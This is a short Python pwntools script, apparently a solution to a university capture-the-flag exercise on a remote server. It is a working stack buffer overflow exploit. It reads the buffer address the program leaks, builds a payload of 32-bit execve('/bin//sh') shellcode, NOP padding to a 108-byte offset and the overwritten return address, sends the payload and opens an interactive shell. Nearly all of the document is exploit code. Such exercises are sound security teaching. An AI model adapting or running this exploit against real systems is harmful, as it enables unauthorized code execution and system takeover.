from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
else:
    p = remote("ctf-fsi.fe.up.pt", 4001)

# -- Shellcode for 32bit i386 -- #
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"

# -- Retrives buffer address from the program output -- #
address = p.recvline_contains(b'Your buffer is')[17:25].decode('utf-8')
print("Buffer address: " + address)

# -- Prepares buffer address for the payload -- #
buffer = bytearray.fromhex(address)
buffer.reverse()

# -- Offset found during code analysis with gdb -- #
offset= 108

# -- Payload Construction -- #
payload = shellcode + b'\x90' * (offset -  len(shellcode)) + buffer

print('Sending Payload...')
p.sendline(payload)
p.interactive()
